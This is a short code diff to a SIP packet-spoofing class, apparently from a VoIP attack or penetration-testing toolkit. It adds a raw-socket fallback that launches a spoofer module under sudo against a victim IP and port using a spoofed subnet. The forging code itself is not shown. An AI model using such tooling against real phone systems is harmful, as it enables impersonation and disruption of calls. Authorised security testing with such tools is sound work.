@@ -273,5 +273,45 @@ class SipPacketSpoofer:
             return True
         except Exception as e:
             print_warning(f"Failed to bind spoofing function to queue {self.attack_queue_num}: {e}")
+            print_info("Attempting fallback to raw socket spoofing...")
+            return self._start_raw_socket_spoofing()
+
+    def _start_raw_socket_spoofing(self) -> bool:
+        """
+        Start raw socket spoofing as a fallback when NFQUEUE is not available.
+        
+        Returns:
+            bool: True if raw socket spoofing started successfully
+        """
+        try:
+            print_info("Starting raw socket spoofing (NFQUEUE fallback)")
+            self.spoofer_process = run_python(
+                module="sip_attacks.raw_spoofer",
+                args=[
+                    str(self.attack_queue_num),
+                    str(self.spoofed_subnet),
+                    self.victim_ip,
+                    str(self.victim_port),
+                    str(self.attacker_port),
+                    self.verbosity,
+                ],
+                want_sudo=True,
+                sudo_preserve_env=True,
+                sudo_non_interactive=False,
+                new_terminal=False,
+                open_window=self.open_window,
+                window_title="SIP Raw Spoofer",
+                interactive=False,
+                dry_run=self.dry_run,
+                keep_window_open=False
+            )
+
+            # Wait for the raw spoofer to be ready
+            if not self.dry_run:
+                wait_ready_signal(self.attack_queue_num)
+            print_success("Raw socket spoofing started successfully")
+            return True
+        except Exception as e:
+            print_error(f"Failed to start raw socket spoofing: {e}")
             return False
             
